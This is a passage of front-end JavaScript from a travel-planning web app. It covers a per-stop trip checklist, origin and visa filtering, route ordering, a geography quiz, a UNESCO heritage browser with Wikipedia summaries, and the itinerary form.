  }
  state.todo.push({ text: t, done: false, where: (where || '').slice(0, 80) });
  if (!quiet) { saveTodo(); paintTripRail(); markAdded(); }
  return true;
}

/* Everything the itinerary suggested, in one press, each line tagged with the
   stop it belongs to so a four-country trip does not become one flat list. */
function addAllFromItinerary(days, stops) {
  let n = 0;
  days.forEach((day) => {
    const where = whereForDay(day, stops);
    (day.items || []).forEach((item) => { if (addTodo(item, where, true)) n += 1; });
  });
  saveTodo(); paintTripRail(); markAdded();
  flash(n ? `${n} added to your trip list` : 'those are already on your list');
}

/* Which stop a day belongs to. The itinerary does not say, so it is read out
   of the day's own words — the theme first, then the items. A day that names
   no stop keeps the previous one, which is how multi-day stays read. */
let lastWhere = '';
function whereForDay(day, stops) {
  if (stops.length === 1) return labelFor(stops[0]);
  const hay = `${day.theme || ''} ${(day.items || []).join(' ')}`.toLowerCase();
  const hit = stops.find((st) => {
    const city = (st.city || '').toLowerCase();
    const country = (st.country || '').toLowerCase();
    return (city && hay.includes(city)) || (country && hay.includes(country));
  });
  if (hit) lastWhere = labelFor(hit);
  return lastWhere;
}

function labelFor(st) {
  const city = st.city || st.label || '';
  const country = st.country || '';
  return country && !city.includes(country) ? `${city}, ${country}` : city;
}

function todoHTML() {
  const done = state.todo.filter((i) => i.done).length;
  return `<div class="rcard">
    <h4>${ICON('i-ticket')}Trip list</h4>
    ${state.todo.length
      ? `<p class="rnote todocount">${done} of ${state.todo.length} done${
          signedIn() ? '' : ' · saved in this browser'}</p>`
      : `<p class="rnote">Build an itinerary and press <b>+</b> on anything you
           want to keep. Add your own below. Tick them off as you go.</p>`}
    ${todoGroupsHTML()}
    <form class="todoadd" id="todo-add">
      <input class="inp" id="todo-text" maxlength="160" placeholder="add your own…"
             autocomplete="off" />
      <button class="btn sm solid" type="submit">${ICON('i-plus')}</button>
    </form>
    ${state.todo.some((i) => i.done)
      ? `<button class="btn sm ghost tdclear" type="button" id="todo-clear">
           Clear the ticked ones</button>` : ''}
  </div>`;
}

/* Grouped under the stop each line belongs to, in the order the list is in,
   so the checklist reads city by city the way the trip is actually taken. */
function todoGroupsHTML() {
  if (!state.todo.length) return '';
  const groups = [];
  state.todo.forEach((it, i) => {
    const where = it.where || '';
    const last = groups[groups.length - 1];
    if (last && last.where === where) last.rows.push([it, i]);
    else groups.push({ where, rows: [[it, i]] });
  });
  const row = ([it, i]) => `
    <li class="${it.done ? 'done' : ''}">
      <label><input type="checkbox" data-td="${i}"${it.done ? ' checked' : ''} />
        <span>${esc(it.text)}</span></label>
      <div class="tdmove">
        <button class="move" data-tdup="${i}"${i === 0 ? ' disabled' : ''}>&#9650;</button>
        <button class="move" data-tddown="${i}"${i === state.todo.length - 1 ? ' disabled' : ''}>&#9660;</button>
      </div>
      <button class="kill" data-tdkill="${i}" title="Remove">&times;</button>
    </li>`;
  return groups.map((g) =>
    `${g.where ? `<p class="tdwhere">${ICON('i-stamp')}${esc(g.where)}</p>` : ''}`
    + `<ul class="todolist">${g.rows.map(row).join('')}</ul>`).join('');
}

function wireTodo(rail) {
  rail.querySelectorAll('[data-td]').forEach((b) => b.onchange = () => {
    state.todo[+b.dataset.td].done = b.checked;
    saveTodo(); paintTripRail();
  });
  rail.querySelectorAll('[data-tdkill]').forEach((b) => b.onclick = () => {
    state.todo.splice(+b.dataset.tdkill, 1); saveTodo(); paintTripRail();
  });
  rail.querySelectorAll('[data-tdup]').forEach((b) => b.onclick = () => {
    const i = +b.dataset.tdup;
    [state.todo[i - 1], state.todo[i]] = [state.todo[i], state.todo[i - 1]];
    saveTodo(); paintTripRail();
  });
  rail.querySelectorAll('[data-tddown]').forEach((b) => b.onclick = () => {
    const i = +b.dataset.tddown;
    [state.todo[i + 1], state.todo[i]] = [state.todo[i], state.todo[i + 1]];
    saveTodo(); paintTripRail();
  });
  const form = rail.querySelector('#todo-add');
  if (form) form.onsubmit = (e) => {
    e.preventDefault();
    const inp = rail.querySelector('#todo-text');
    addTodo(inp.value); inp.value = ''; rail.querySelector('#todo-text')?.focus();
  };
  const clear = rail.querySelector('#todo-clear');
  if (clear) clear.onclick = () => {
    state.todo = state.todo.filter((i) => !i.done); saveTodo(); paintTripRail();
  };
}

/* A tick on the button you just pressed, so it is obvious the line landed in
   a list that may be scrolled out of sight. */
let addedTimer = null;
function markAdded() {
  clearTimeout(addedTimer);
  const rail = $('#triprail');
  if (!rail) return;
  rail.classList.add('justadded');
  addedTimer = setTimeout(() => rail.classList.remove('justadded'), 900);
}

/* Trip origin. It defaults to where you live, because that is the common
   case, but a trip can start anywhere and the distances, the flights and the
   leg home all have to follow the trip rather than the profile. */
// `touched` is the difference between "the user chose New York" and "we
// defaulted to New York because that is home". Until they choose, the origin
// follows home — the profile can load after this page is first built.
const tripOrigin = { iso3: null, city: null, country: null, touched: false };

/* state.isoName is built from the map, which has no GBR row, so a UK origin
   came out as the bare code. The picker already knows the proper name. */
function countryLabel(iso3) {
  if (!iso3) return null;
  const opt = [...($('#o-country') || { options: [] }).options]
    .find((o) => o.value === iso3);
  return state.isoName.get(iso3) || (opt && opt.textContent) || iso3;
}

function countryRows() {
  const rows = [...state.byName.entries()].filter(([, c]) => c.iso3);
  // The map carries the UK as its four nations and gives them no ISO3, so that
  // nobody can pin Scotland and the United Kingdom and double-count. The trip
  // picker needs a country code to look up cities, visas and distances, which
  // left it with no way to reach London at all. For travel it is one place.
  if (!rows.some(([, c]) => c.iso3 === 'GBR')) {
    rows.push(['United Kingdom', { iso3: 'GBR', iso2: 'gb' }]);
  }
  return rows.sort((a, b) => a[0].localeCompare(b[0]));
}

/* Only the countries this passport can enter without arranging anything
   first. "Visa free" here means "nothing to do before you board", which
   includes visa on arrival and excludes e-visas — an e-visa is paperwork with
   a deadline, and filing it under "no visa needed" is how people miss flights. */
function visaFreeSet() {
  if (!state.visa) return null;
  return new Set(Object.entries(state.visa)
    .filter(([, v]) => !v.advance).map(([iso]) => iso));
}

function fillStopCountries() {
  const sel = $('#s-country');
  if (!sel) return;
  const free = state.visaFreeOnly ? visaFreeSet() : null;
  const rows = countryRows().filter(([, c]) => !free || free.has(c.iso3));
  const keep = sel.value;
  sel.innerHTML = `<option value="">choose a country…</option>`
    + rows.map(([n, c]) => `<option value="${c.iso3}">${esc(n)}</option>`).join('');
  if (keep && rows.some(([, c]) => c.iso3 === keep)) sel.value = keep;

  // boot() routes once before /api/countries has landed, so the first pass
  // sees an empty list. The guard used to be "has it got more than one option
  // yet" — which the synthesised United Kingdom row satisfied on its own, so
  // the select kept its two entries and the real list never arrived. Compare
  // against the row count instead, and keep whatever was already chosen.
  const osel = $('#o-country');
  if (osel) {
    const all = countryRows();
    if (osel.options.length !== all.length + 1) {
      const keepO = osel.value;
      osel.innerHTML = `<option value="">choose a country…</option>`
        + all.map(([n, c]) => `<option value="${c.iso3}">${esc(n)}</option>`).join('');
      if (keepO && all.some(([, c]) => c.iso3 === keepO)) osel.value = keepO;
      else if (!tripOrigin.touched) resetOrigin();
    }
  }
  paintVisaFree();
  paintTripRail();
}

function paintVisaFree() {
  const box = $('#s-visafree');
  if (!box) return;
  if (!state.visa) {
    box.innerHTML = `<span class="hintline">${ICON('i-ticket')}`
      + `Set your passport to filter by visa.</span>`;
    return;
  }
  const free = visaFreeSet();
  box.innerHTML = `<label class="check inline"><input type="checkbox" id="s-vf"`
    + `${state.visaFreeOnly ? ' checked' : ''} /> `
    + `Only show countries I can enter without a visa</label>`
    + `<span class="hintline">${free.size} of ${countryRows().length} on a `
    + `${esc(state.passport || '—')} passport · visa on arrival counts, an e-visa `
    + `does not</span>`;
  $('#s-vf').onchange = (e) => {
    state.visaFreeOnly = e.target.checked;
    fillStopCountries();
    fillStopCities();
  };
}

function resetOrigin() {
  tripOrigin.iso3 = state.home || null;
  tripOrigin.city = state.homeCity || null;
  const osel = $('#o-country');
  if (osel) { osel.value = tripOrigin.iso3 || ''; fillOriginCities(tripOrigin.city); }
}

async function fillOriginCities(pick) {
  const iso = $('#o-country').value, sel = $('#o-city');
  if (!sel) return;
  sel.innerHTML = `<option value="">capital city</option>`;
  tripOrigin.iso3 = iso || null;
  if (!iso) { tripOrigin.city = null; return paintTripRail(); }
  try {
    sel.innerHTML += cityOptions(await citiesFor(iso));
    if (pick) sel.value = pick;
  } catch (e) { /* the country alone is a usable origin */ }
  tripOrigin.city = sel.value || null;
  paintTripRail();
}

/* The want-list, beside the form rather than above it. It is a shortlist to
   pull from while you build, not a step you work through once. */
function paintTripRail() {
  const rail = $('#triprail');
  if (window.__paintStudentNote) window.__paintStudentNote();
  if (!rail) return;
  const wants = [...state.labels.want];
  const on = new Set(state.stops.map((s) => s.iso3));
  const from = tripOrigin.iso3
    ? (tripOrigin.city ? `${tripOrigin.city}, ` : '')
      + countryLabel(tripOrigin.iso3)
    : null;
  rail.innerHTML = `
    <div class="rcard">
      <h4>${ICON('i-plane')}Setting out from</h4>
      <p class="rfrom">${from ? esc(from) : 'nowhere set yet'}</p>
      <p class="rnote">${from
        ? 'Distances, flights and the leg home are all measured from here.'
        : 'Pick a country on the left and the trip gets measured from it.'}</p>
    </div>
    <div class="rcard">
      <h4>${ICON('i-sparkle')}Places you want to visit</h4>
      <p class="rnote">Pinned <b>want to go</b> on your map. Click one to drop it
        straight into the trip.</p>
      ${wants.length
        ? `<div class="wantchips">${wants.map((w) => {
            const c = state.byName.get(w);
            const added = c && on.has(c.iso3);
            return `<button type="button" class="wchip${added ? ' added' : ''}"
              data-w="${esc(w)}"${added ? ' disabled' : ''}>`
              + `${added ? ICON('i-ticket') : ICON('i-plus')}${esc(w)}</button>`;
          }).join('')}</div>`
        : `<p class="rempty">Nothing pinned yet — mark a few countries
             <b>want to go</b> on the map and they will wait for you here.</p>`}
    </div>
    ${state.routeHint ? `
    <div class="rcard">
      <h4>${ICON('i-route')}What are you waiting for?</h4>
      <div class="rroute">${state.routeHint.stops.map((n, i) =>
        `${i ? '<i>→</i>' : ''}<span${i === 0 || i === state.routeHint.stops.length - 1
          ? ' class="h"' : ''}>${esc(n)}</span>`).join('')}</div>
      <p class="rkm"><b>${state.routeHint.km.toLocaleString()} km</b>${
        state.routeHint.saved > 0
          ? ` · saves ${state.routeHint.saved.toLocaleString()} km` : ''}</p>
      <p class="rwish">Every country you said you want to see, in the order
        that flies least. It is one trip.</p>
    </div>` : ''}`;
  rail.innerHTML += todoHTML();
  rail.querySelectorAll('[data-w]').forEach((b) =>
    b.onclick = () => addStopByName(b.dataset.w));
  wireTodo(rail);
}

/* Every city we hold for the country, not the first 25.

   A flat list of 3,408 American cities is technically complete and useless to
   read, so the biggest dozen are repeated at the top under their own heading
   and the rest follow alphabetically. Native selects jump to what you type,
   which works on an A–Z list and does not on one ordered by population. */
function cityOptions(rows) {
  if (!rows.length) return '';
  const big = rows.slice(0, 12);
  const az = [...rows].sort((a, b) => a.city.localeCompare(b.city));
  const opt = (c) => `<option value="${esc(c.city)}">${esc(c.city)}`
    + `${c.state ? ' — ' + esc(c.state) : ''}${c.capital ? ' ★' : ''}</option>`;
  if (rows.length <= 14) return az.map(opt).join('');
  return `<optgroup label="Largest">${big.map(opt).join('')}</optgroup>`
    + `<optgroup label="All ${rows.length.toLocaleString()}, A–Z">`
    + `${az.map(opt).join('')}</optgroup>`;
}

async function citiesFor(iso) {
  const d = await get(`/api/cities?country=${encodeURIComponent(iso)}&limit=4000`);
  return d.cities || [];
}

async function fillStopCities() {
  const iso = $('#s-country').value, sel = $('#s-city');
  sel.innerHTML = `<option value="">anywhere in the country</option>`;
  if (!iso) return;
  try {
    sel.innerHTML += cityOptions(await citiesFor(iso));
  } catch (e) { /* the country alone is still a valid stop */ }
}

function renderStops() {
  const box = $('#s-list');
  const hint = $('#s-orderhint');
  if (!state.stops.length) {
    box.innerHTML = `<div class="stopnone">No stops yet — choose a country and
      press <b>Add</b>. Add several for a multi-stop trip.</div>`;
    $('#s-route').hidden = true;
    if (hint) hint.hidden = true;
    paintTripRail();
    return;
  }
  if (hint) hint.hidden = state.stops.length < 2;
  box.innerHTML = state.stops.map((st, i) => `
    <div class="stop">
      <span class="num">${i + 1}</span>
      <div class="who"><b>${esc(st.city || st.country)}</b>
        <span>${esc(st.city ? st.country : 'no city chosen — planned around the capital')}</span></div>
      <div style="display:flex;flex-direction:column;gap:3px">
        <button class="move" data-up="${i}" ${i === 0 ? 'disabled' : ''}>▲</button>
        <button class="move" data-down="${i}" ${i === state.stops.length - 1 ? 'disabled' : ''}>▼</button>
      </div>
      <button class="kill" data-kill="${i}" title="Remove">&times;</button>
    </div>`).join('');
  box.querySelectorAll('[data-kill]').forEach((b) => b.onclick = () => {
    state.stops.splice(+b.dataset.kill, 1); renderStops(); refreshRoute();
  });
  box.querySelectorAll('[data-up]').forEach((b) => b.onclick = () => {
    const i = +b.dataset.up;
    [state.stops[i - 1], state.stops[i]] = [state.stops[i], state.stops[i - 1]];
    renderStops(); refreshRoute();
  });
  box.querySelectorAll('[data-down]').forEach((b) => b.onclick = () => {
    const i = +b.dataset.down;
    [state.stops[i + 1], state.stops[i]] = [state.stops[i], state.stops[i + 1]];
    renderStops(); refreshRoute();
  });
  paintTripRail();
}

async function refreshRoute() {
  const bar = $('#s-route');
  if (state.stops.length < 2) { bar.hidden = true; return; }
  try {
    const d = await post('/api/trip/route', {
      stops: state.stops.map((s) => ({ iso3: s.iso3, city: s.city || null })),
      home: state.home, home_city: state.homeCity,
      origin_iso3: tripOrigin.iso3, origin_city: tripOrigin.city,
    });
    bar.hidden = false;
    bar.innerHTML = `<span class="pill2">${ICON('i-route')} `
      + `<b>${d.total_km.toLocaleString()} km</b> in the best order</span>`
      + (d.saved_km > 0
        ? `<span>saves <b>${d.saved_km.toLocaleString()} km</b> against the order you added them</span>`
        : `<span>already the shortest order</span>`)
      + (d.home_known ? '' : `<span>set where you are starting from to measure the trip</span>`)
      + `<button class="btn sm" type="button" id="s-reorder" style="margin:0">`
      + `${ICON('i-compass')}Use that order</button>`;
    $('#s-reorder').onclick = () => {
      // the solved order, mapped back onto our own stop objects
      const key = (x) => `${x.iso3}|${x.city || ''}`;
      const want = d.order.map((o) => key({ iso3: o.iso3, city: o.city }));
      state.stops.sort((a, b) => want.indexOf(key(a)) - want.indexOf(key(b)));
      renderStops(); refreshRoute();
    };
  } catch (e) { bar.hidden = true; }
}

on('#s-country', 'onchange', fillStopCities);
on('#o-country', 'onchange', () => {
  tripOrigin.touched = true; fillOriginCities(); refreshRoute();
});
on('#o-city', 'onchange', () => {
  tripOrigin.touched = true;
  tripOrigin.city = $('#o-city').value || null;
  paintTripRail(); refreshRoute();
});
on('#o-reset', 'onclick', () => {
  tripOrigin.touched = false; resetOrigin(); paintTripRail(); refreshRoute();
});
on('#s-add', 'onclick', () => {
  const iso = $('#s-country').value;
  if (!iso) return;
  const country = state.isoName.get(iso) || countryLabel(iso) || iso;
  const city = $('#s-city').value || null;
  if (state.stops.some((s) => s.iso3 === iso && (s.city || null) === city)) return;
  if (state.stops.length >= 10) return;
  state.stops.push({ iso3: iso, country, city });
  $('#s-city').value = '';
  renderStops(); refreshRoute();
});

/* ================================================================ quiz === */
const qz = { kind: 'mixed', qs: [], at: 0, right: 0, answered: null, wrong: [] };

async function startQuiz() {
  const out = $('#qz-out');
  thinking(out, 'writing the questions…');
  try {
    const d = await get(`/api/quiz?kind=${encodeURIComponent(qz.kind)}&n=10`);
    Object.assign(qz, { qs: d.questions || [], at: 0, right: 0, answered: null, wrong: [] });
    renderQuiz();
  } catch (e) { oops(out, e); }
}

function renderQuiz() {
  const out = $('#qz-out');
  if (qz.at >= qz.qs.length) return renderScore();
  const q = qz.qs[qz.at];
  const done = qz.answered !== null;
  out.innerHTML = `
    <div class="qzbar">
      <span>Question <b>${qz.at + 1}</b> of ${qz.qs.length}</span>
      <span class="qzscore">${qz.right} right</span>
      <span class="qztrack">${qz.qs.map((_, i) =>
        `<i class="${i < qz.at ? (qz.wrong.includes(i) ? 'miss' : 'hit') : ''}"></i>`).join('')}</span>
    </div>
    <div class="qzcard">
      ${q.flag ? `<img class="qzflag" src="https://flagcdn.com/w320/${esc(q.flag)}.png" alt="" />` : ''}
      <h2>${esc(q.prompt)}</h2>
      <div class="qzopts">${q.options.map((o, i) => {
        let cls = '';
        if (done) {
          if (i === q.answer) cls = ' right';
          else if (i === qz.answered) cls = ' wrong';
          else cls = ' faded';
        }
        return `<button type="button" class="qzopt${cls}" data-pick="${i}"
                  ${done ? 'disabled' : ''}>${esc(o)}</button>`;
      }).join('')}</div>
      ${done ? `<p class="qznote">${qz.answered === q.answer
          ? '<b class="ok">Right.</b> ' : '<b class="no">Not quite.</b> '}${esc(q.note)}</p>
        <button class="btn solid" type="button" id="qz-next">
          ${qz.at === qz.qs.length - 1 ? 'See the score' : 'Next question'}</button>` : ''}
    </div>`;
  out.querySelectorAll('[data-pick]').forEach((b) => b.onclick = () => {
    if (qz.answered !== null) return;
    qz.answered = +b.dataset.pick;
    if (qz.answered === q.answer) qz.right += 1; else qz.wrong.push(qz.at);
    renderQuiz();
  });
  const next = $('#qz-next');
  if (next) next.onclick = () => { qz.at += 1; qz.answered = null; renderQuiz(); };
}

function renderScore() {
  const n = qz.qs.length, r = qz.right;
  const pct = Math.round(r / n * 100);
  // Said plainly rather than flattered: ten questions is a small sample and
  // the verdict says so.
  const line = pct === 100 ? 'Perfect. Ten from ten.'
    : pct >= 80 ? 'Strong. You know the map.'
    : pct >= 50 ? 'Respectable — the gaps are worth a look.'
    : 'Plenty left to learn, which is rather the point.';
  $('#qz-out').innerHTML = `
    <div class="qzcard qzdone">
      <div class="qzbig">${r}<small>/${n}</small></div>
      <h2>${esc(line)}</h2>
      <p class="qznote">Ten questions is a small sample — it says more about
        which corners you know than about how much you know.</p>
      <div class="qzagain">
        <button class="btn solid" type="button" id="qz-again">Play again</button>
        <a class="btn" href="#/map">Go paint the map</a>
      </div>
    </div>`;
  $('#qz-again').onclick = startQuiz;
}

$$('#qz-kind .segb').forEach((b) => b.onclick = () => {
  qz.kind = b.dataset.kind;
  $$('#qz-kind .segb').forEach((x) => x.classList.toggle('on', x === b));
});
on('#qz-start', 'onclick', startQuiz);

/* ============================================================ heritage === */
/* One country at a time, because 1,500 cards is not a page anybody reads and
   the question is always "what is in the place I am going to". */
const whState = { iso3: null, sites: [], countries: [], q: '', caveat: '' };

async function heritage() {
  const sel = $('#wh-country');
  if (!sel) return;
  if (!whState.countries.length) {
    const d = await get('/api/collections/heritage');
    whState.countries = d.countries || [];
    whState.caveat = d.caveat || '';
    sel.innerHTML = whState.countries.map((c) =>
      `<option value="${c.iso3}">${esc(c.name)} — ${c.n}</option>`).join('');
    // open on somewhere the user has a connection to, not alphabetical Afghanistan
    const mine = state.home && whState.countries.some((c) => c.iso3 === state.home)
      ? state.home
      : (whState.countries.find((c) => c.iso3 === 'ITA') || whState.countries[0]).iso3;
    sel.value = mine;
    whState.iso3 = mine;
  }
  await loadHeritage();
}

async function loadHeritage() {
  const out = $('#wh-out');
  thinking(out, 'fetching the list…');
  try {
    const d = await get('/api/collections/heritage?country='
      + encodeURIComponent(whState.iso3));
    whState.sites = d.sites || [];
    renderHeritage();
  } catch (e) { oops(out, e); }
}

function renderHeritage() {
  const out = $('#wh-out');
  const needle = whState.q.trim().toLowerCase();
  const rows = needle
    ? whState.sites.filter((s) => s.name.toLowerCase().includes(needle))
    : whState.sites;
  const country = (whState.countries.find((c) => c.iso3 === whState.iso3) || {}).name || '';
  if (!rows.length) {
    out.innerHTML = `<div class="stopnone">Nothing matches that.</div>`;
    return;
  }
  out.innerHTML = `<p class="parkcount">${rows.length} site${rows.length === 1 ? '' : 's'}
      in ${esc(country)} — click one for the detail.</p>`
    + `<div class="grid">${rows.map((s) => `
      <button class="park" type="button" data-wh="${esc(s.id)}">
        <div class="shot">${s.photo
          ? `<img src="${esc(s.photo)}" alt="" loading="lazy"
                  onerror="this.closest('.shot').classList.add('broken')" />`
          : `<div class="noimg">${ICON('i-tower')}</div>`}
          <img class="flagbadge" src="${flagFor(s.iso3)}" alt="" /></div>
        <div class="body"><h4>${esc(s.name)}</h4>
          ${s.listed ? `<div class="est">founded ${esc(s.listed)}</div>` : ''}
        </div>
      </button>`).join('')}</div>`
    + `<p class="credit">${esc(whState.caveat)}</p>`;
  out.querySelectorAll('[data-wh]').forEach((b) =>
    b.onclick = () => openHeritage(b.dataset.wh));
}

function flagFor(iso3) {
  const c = [...state.byName.values()].find((x) => x.iso3 === iso3);
  return c && c.iso2 ? `https://flagcdn.com/w40/${c.iso2.toLowerCase()}.png` : BLANK;
}

/* The detail comes from Wikipedia rather than a model: it is a real article
   with a real author, and a summary of somewhere that exists is not something
   worth generating when it has already been written. */
async function openHeritage(id) {
  const site = whState.sites.find((s) => s.id === id);
  if (!site) return;
  const modal = $('#whmodal'), body = $('#wh-body');
  modal.hidden = false;
  body.innerHTML = `<h2>${esc(site.name)}</h2>`
    + `<p class="sub">${esc((whState.countries.find((c) => c.iso3 === site.iso3) || {}).name || '')}`
    + `${site.listed ? ` · founded ${esc(site.listed)}` : ''}</p>`
    + (site.photo_large ? `<img class="whshot" src="${esc(site.photo_large)}" alt=""
         onerror="this.remove()" />` : '')
    + `<div id="wh-text"><div class="thinking"><i></i><i></i><i></i></div></div>`
    + `<div class="golinks" style="margin-top:14px">`
    + `<a class="golink" href="${esc(site.unesco_url)}" target="_blank"
         rel="noopener noreferrer">${ICON('i-stamp')}UNESCO listing</a>`
    + (site.wiki ? `<a class="golink" href="https://en.wikipedia.org/wiki/${esc(site.wiki)}"
         target="_blank" rel="noopener noreferrer">${ICON('i-link')}Wikipedia</a>` : '')
    + (site.lat ? `<a class="golink" href="https://www.google.com/maps/search/?api=1&query=${site.lat},${site.lon}"
         target="_blank" rel="noopener noreferrer">${ICON('i-route')}Map</a>` : '')
    + `</div>`;
  const text = $('#wh-text');
  if (!site.wiki) {
    text.innerHTML = `<p class="rnote">No article to summarise — the UNESCO
      listing has the official description.</p>`;
    return;
  }
  try {
    const r = await fetch('https://en.wikipedia.org/api/rest_v1/page/summary/'
      + encodeURIComponent(site.wiki));
    const d = await r.json();
    text.innerHTML = d.extract
      ? `<p>${esc(d.extract)}</p><p class="credit">From Wikipedia, CC BY-SA.</p>`
      : `<p class="rnote">No summary available.</p>`;
  } catch (e) {
    text.innerHTML = `<p class="rnote">Could not reach Wikipedia just now.</p>`;
  }
}

on('#wh-country', 'onchange', () => {
  whState.iso3 = $('#wh-country').value; whState.q = '';
  const srch = $('#wh-search'); if (srch) srch.value = '';
  loadHeritage();
});
on('#wh-search', 'oninput', () => {
  whState.q = $('#wh-search').value; renderHeritage();
});
on('#wh-close', 'onclick', () => { $('#whmodal').hidden = true; });
on('#whmodal', 'onclick', (e) => {
  if (e.target.id === 'whmodal') $('#whmodal').hidden = true;
});

/* ================================================================= trip === */
function tripForm(country = '') {
  // the want-list now lives in the rail beside the form, not inline above it
  $('#trip-form').innerHTML = `
    <div class="filters" id="t-filters" style="margin-bottom:12px"></div>
    <div id="t-visa"></div>
    <div id="t-student"></div>
    <div class="frow">
      <label class="fld"><span>Days</span>
        <input class="inp" id="t-days" type="number" value="5" min="1" max="30" /></label>
      <label class="fld"><span>Hours a day sightseeing</span>
        <input class="inp" id="t-hours" type="number" value="5" min="1" max="14" /></label>
    </div>

    <div class="fld">
      <span>Who is going</span>
      <div class="seg" id="t-band">
        <button type="button" class="segb on" data-band="small">Small<i>under 5</i></button>
        <button type="button" class="segb"    data-band="medium">Medium<i>5–20</i></button>
        <button type="button" class="segb"    data-band="large">Large<i>21–40</i></button>
      </div>
    </div>
    <div class="frow">
      <label class="fld"><span>Exactly how many people</span>
        <input class="inp" id="t-people" type="number" value="2" min="1" max="40" /></label>
      <div class="fld"><span>What that changes</span>
        <p class="bandnote" id="t-bandnote"></p></div>
    </div>
    <div class="frow">
      <label class="fld"><span>Style</span>
        <select class="inp" id="t-style">
          <option value="mixed">cultural + relaxing</option>
          <option value="cultural">cultural only</option>
          <option value="relaxing">relaxing only</option></select></label>
      <label class="fld"><span>Stay</span>
        <select class="inp" id="t-stay">
          <option>3-star</option><option>4-star</option><option>5-star</option><option>hostel</option>
        </select></label>
    </div>
    <label class="check"><input id="t-guide" type="checkbox" />
      plan around a local guide
      <i>shapes the days for a guided visit and shows where to book one</i></label>
    <button class="btn solid" id="go-trip">${ICON('i-plane')}Build the itinerary</button>`;

  /* Visas across the whole trip. Someone planning four countries needs to know
     which of them need paperwork before they book, not at the third border. */
  const fbar = $('#t-filters');

  function paintVisaFilter() {
    fbar.innerHTML = state.visa
      ? `<button type="button" class="chip-f" id="t-visafree">`
        + `${ICON('i-ticket')}Check visas for my stops</button>`
      : `<span class="leadsub" style="margin:0">Set your passport to check visas.</span>`;
    if ($('#t-visafree')) $('#t-visafree').onclick = () => paintVisaBox(true);
  }

  function paintVisaBox(force) {
    const box = $('#t-visa');
    if (!state.visa || !state.stops.length) { box.innerHTML = ''; return; }
    // "needs a visa" means "needs paperwork before you board", which includes
    // e-visas and travel authorisations — not just embassy appointments.
    const need = [], easy = [];
    state.stops.forEach((st) => {
      const v = state.visa[st.iso3];
      if (!v) return;
      (v.advance ? need : easy).push({ name: st.country, detail: v.detail });
    });
    if (!need.length && !force) { box.innerHTML = ''; return; }
    box.innerHTML = need.length
      ? `<div class="visabox need">${ICON('i-tower')}<div>`
        + `<b>${need.length} of your ${state.stops.length} stop`
        + `${state.stops.length === 1 ? '' : 's'} `
        + `${need.length === 1 ? 'needs' : 'need'} paperwork before you travel</b><span>`
        + need.map((n) => `${esc(n.name)} — ${esc(n.detail)}`).join('; ')
        + `. On a ${esc(state.passport)} passport. Apply before you book; `
        + `processing can take weeks.</span></div></div>`
      : `<div class="visabox ok">${ICON('i-ticket')}<div>`
        + `<b>Nothing to arrange before you travel</b><span>`
        + `All ${state.stops.length} stop${state.stops.length === 1 ? '' : 's'} are `
        + `visa free or visa on arrival for a ${esc(state.passport)} passport.`
        + `</span></div></div>`;
  }

  /* A visa in the passport is not what gets a student back in. The I-20 and
     its travel signature are, and an expired signature is the common way this
     goes wrong — it is checked at the border, not at the airline desk, so
     nobody catches it for you. Shown when the trip returns to the United
     States on a passport that is not American; the wording stays conditional
     so it reads as a reminder to the people it applies to and as nothing to
     anyone else. We do not ask what visa someone holds, and we are not going
     to start — so this names the documents and sends them to the office that
     can actually confirm their case. */
  function paintStudentNote() {
    const box = $('#t-student');
    if (!box) return;
    const returning = (tripOrigin.iso3 || state.home) === 'USA';
    if (!returning || state.passport === 'USA') { box.innerHTML = ''; return; }
    box.innerHTML = `<div class="studentbox">${ICON('i-stamp')}<div>
      <b>Studying in the United States? Check your documents before you book.</b>
      <span>Coming back in needs more than the visa itself. Travel with your
      passport, a valid <b>F-1 or J-1 visa stamp</b>, and your <b>I-20</b>
      (or <b>DS-2019</b> on J-1) carrying a current <b>travel signature</b>
      from your DSO — a signature is good for twelve months, or six if you are
      on OPT. Carry proof of enrolment and of funding, and your EAD card and
      an employment letter if you are on OPT. An expired signature is the one
      that catches people out, and it is checked at the border rather than at
      check-in. Signatures can take your international student office days to
      issue, so ask before you book, and confirm your own case with them —
      this is a reminder, not immigration advice.</span></div></div>`;
  }

  window.__paintStudentNote = paintStudentNote;
  window.__paintVisaBox = paintVisaBox;
  window.__paintVisaFilter = paintVisaFilter;
  paintVisaFilter();
  paintVisaBox(false);
  paintStudentNote();

  /* The band and the head count are two views of one number, so they are kept
     in sync both ways. Letting them disagree would mean sending the planner a
     "large group" of three. */
  const BANDS = {
    small:  { lo: 1,  hi: 4,  pick: 2,
      note: 'Taxis and walking. Walk-ins are realistic, and the days can stay loose.' },
    medium: { lo: 5,  hi: 20, pick: 10,
      note: 'One minibus, one long table. Restaurants and guided entry need calling ahead.' },
    large:  { lo: 21, hi: 40, pick: 25,
      note: 'A coach, timed entry and block bookings. Some sites cannot take the whole party at once.' },
  };
  const bandOf = (n) => n <= 4 ? 'small' : n <= 20 ? 'medium' : 'large';
  function syncBand(from) {
    const people = $('#t-people');
    let b;
    if (from === 'band') {
      b = $('#t-band .segb.on').dataset.band;
      const n = +people.value || 0;
      if (n < BANDS[b].lo || n > BANDS[b].hi) people.value = BANDS[b].pick;
    } else {
      let n = Math.max(1, Math.min(+people.value || 1, 40));
      people.value = n;
      b = bandOf(n);
      $$('#t-band .segb').forEach((x) => x.classList.toggle('on', x.dataset.band === b));
    }
    people.min = BANDS[b].lo; people.max = BANDS[b].hi;
    $('#t-bandnote').textContent = BANDS[b].note;
  }
  $$('#t-band .segb').forEach((b) => b.onclick = () => {
    $$('#t-band .segb').forEach((x) => x.classList.toggle('on', x === b));
    syncBand('band');
  });
  $('#t-people').oninput = () => syncBand('people');
  $('#t-people').onblur  = () => syncBand('people');
  syncBand('people');

  $('#go-trip').onclick = async () => {
    const out = $('#trip-out');
    if (!state.stops.length) {
      return (out.innerHTML = `<div class="err">${ICON('i-tower')}`
        + `<span>Add at least one stop above.</span></div>`);
    }
    // a long multi-stop plan genuinely takes about a minute, so say so
    thinking(out, state.stops.length > 1
      ? `building a ${state.stops.length}-stop itinerary — this can take a minute…`
      : 'building the itinerary…');
    try {
      const d = await post('/api/trip/plan', {
        stops: state.stops.map((s) => ({ iso3: s.iso3, city: s.city || null })),
        days: +$('#t-days').value, hours_per_day: +$('#t-hours').value,
        style: $('#t-style').value, accommodation: $('#t-stay').value,
        local_guide: $('#t-guide').checked, group_size: +$('#t-people').value,
        home: state.home, home_city: state.homeCity, passport: state.passport,
        origin_iso3: tripOrigin.iso3, origin_city: tripOrigin.city,
        optimise: false,
      });
      const it = d.itinerary, r = d.route;
      out.innerHTML =
        (r && r.legs && r.legs.length > 1
